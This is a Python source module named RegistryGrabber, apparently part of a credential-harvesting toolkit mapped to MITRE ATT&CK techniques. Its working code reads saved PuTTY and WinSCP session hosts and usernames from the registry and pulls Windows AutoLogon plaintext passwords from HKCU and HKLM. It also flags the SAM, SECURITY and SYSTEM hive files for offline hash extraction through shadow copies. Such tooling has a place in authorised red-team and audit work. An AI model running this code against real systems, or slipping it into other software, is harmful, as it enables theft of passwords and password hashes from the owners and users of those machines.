"""
RegistryGrabber — Extract credentials and intel from Windows Registry

Targets (user-level, no admin required):
- HKCU PuTTY sessions (saved session hostnames, usernames)
- HKCU WinSCP sessions (saved sessions from registry)
- HKCU AutoLogon (Windows AutoLogon password)
- HKCU Environment (PATH, custom vars that might contain secrets)

Targets (admin required):
- HKLM SAM (user account hashes — requires offline extraction)
- HKLM SECURITY (LSA secrets, cached domain credentials)
- HKLM SOFTWARE AutoLogon (domain AutoLogon credentials)

Note: SAM/SECURITY hives cannot be read while Windows is running
(they're locked). This module reads what's accessible and flags
the locations of locked hives for offline extraction.

MITRE ATT&CK: T1552.002 (Credentials in Registry), T1003.002 (SAM)
"""

from __future__ import annotations

import os

from ._registry import enum_reg_subkeys, enum_reg_values, read_reg_value
from .base import GrabberContext, GrabberModule
from .models import ExtractedCredential, GrabberResult, GrabberStatus, PrivilegeLevel


class RegistryGrabber(GrabberModule):
    name = "registry"
    description = "Extract credentials from Windows Registry (PuTTY, WinSCP, AutoLogon)"
    min_privilege = PrivilegeLevel.USER
    supported_platforms = ("Windows",)
    default_enabled = True

    def preflight_check(self, context: GrabberContext) -> bool:
        return context.is_windows

    def execute(self, context: GrabberContext) -> GrabberResult:
        result = GrabberResult(module_name=self.name)

        # User-level extractions
        result.credentials.extend(self._extract_putty_sessions())
        result.credentials.extend(self._extract_autologon())
        result.credentials.extend(self._extract_winscp_registry())

        # Admin-level: flag SAM/SECURITY locations
        if context.is_admin:
            result.credentials.extend(self._flag_sam_hives())

        for cred in result.credentials:
            result.findings.append(self.make_finding(
                file_path="REGISTRY",
                description=f"[{cred.target_application}] {cred.username or cred.url or cred.credential_type}",
                score=75 if cred.decrypted_value else 40,
                matched_value=cred.target_application,
            ))

        result.status = GrabberStatus.COMPLETED
        return result

    def _extract_putty_sessions(self) -> list[ExtractedCredential]:
        """Extract PuTTY saved session configurations from HKCU."""
        creds = []
        sessions = enum_reg_subkeys("HKCU", r"Software\SimonTatham\PuTTY\Sessions")

        for session_name in sessions:
            key_path = rf"Software\SimonTatham\PuTTY\Sessions\{session_name}"
            hostname = read_reg_value("HKCU", key_path, "HostName") or ""
            username = read_reg_value("HKCU", key_path, "UserName") or ""
            port = read_reg_value("HKCU", key_path, "PortNumber") or 22
            protocol = read_reg_value("HKCU", key_path, "Protocol") or ""
            proxy_host = read_reg_value("HKCU", key_path, "ProxyHost") or ""

            if hostname:
                creds.append(ExtractedCredential(
                    source_module=self.name,
                    credential_type="password",
                    target_application="PuTTY",
                    url=f"{hostname}:{port}",
                    username=str(username),
                    notes=f"protocol={protocol} proxy={proxy_host}" if proxy_host else f"protocol={protocol}",
                    mitre_technique="T1552.002",
                ))
        return creds

    def _extract_autologon(self) -> list[ExtractedCredential]:
        """Extract Windows AutoLogon credentials from registry."""
        creds = []
        key_path = r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon"

        username = read_reg_value("HKCU", key_path, "DefaultUserName")
        password = read_reg_value("HKCU", key_path, "DefaultPassword")
        domain = read_reg_value("HKCU", key_path, "DefaultDomainName")

        # Also check HKLM (more common location)
        if not username:
            username = read_reg_value("HKLM", key_path, "DefaultUserName")
        if not password:
            password = read_reg_value("HKLM", key_path, "DefaultPassword")
        if not domain:
            domain = read_reg_value("HKLM", key_path, "DefaultDomainName")

        if username and password:
            creds.append(ExtractedCredential(
                source_module=self.name,
                credential_type="password",
                target_application="Windows AutoLogon",
                username=f"{domain}\\{username}" if domain else str(username),
                decrypted_value=str(password),
                mitre_technique="T1552.002",
            ))
        return creds

    def _extract_winscp_registry(self) -> list[ExtractedCredential]:
        """Extract WinSCP sessions from registry (alternate to INI file)."""
        creds = []
        sessions = enum_reg_subkeys("HKCU", r"Software\Martin Prikryl\WinSCP 2\Sessions")

        for session_name in sessions:
            key_path = rf"Software\Martin Prikryl\WinSCP 2\Sessions\{session_name}"
            hostname = read_reg_value("HKCU", key_path, "HostName") or ""
            username = read_reg_value("HKCU", key_path, "UserName") or ""
            port = read_reg_value("HKCU", key_path, "PortNumber") or 22

            if hostname:
                creds.append(ExtractedCredential(
                    source_module=self.name,
                    credential_type="password",
                    target_application="WinSCP (Registry)",
                    url=f"{hostname}:{port}",
                    username=str(username),
                    notes=f"session={session_name}",
                    mitre_technique="T1552.002",
                ))
        return creds

    @staticmethod
    def _flag_sam_hives() -> list[ExtractedCredential]:
        """Flag SAM/SECURITY/SYSTEM hive locations for offline extraction."""
        creds = []
        hives = [
            (r"C:\Windows\System32\config\SAM", "SAM (password hashes)"),
            (r"C:\Windows\System32\config\SECURITY", "SECURITY (LSA secrets, cached creds)"),
            (r"C:\Windows\System32\config\SYSTEM", "SYSTEM (boot key for SAM decryption)"),
        ]
        for hive_path, description in hives:
            if os.path.exists(hive_path):
                creds.append(ExtractedCredential(
                    source_module="registry",
                    credential_type="key",
                    target_application="Registry Hive",
                    url=hive_path,
                    notes=f"{description} — locked while running, use shadow copy for offline extraction",
                    mitre_technique="T1003.002",
                ))
        return creds
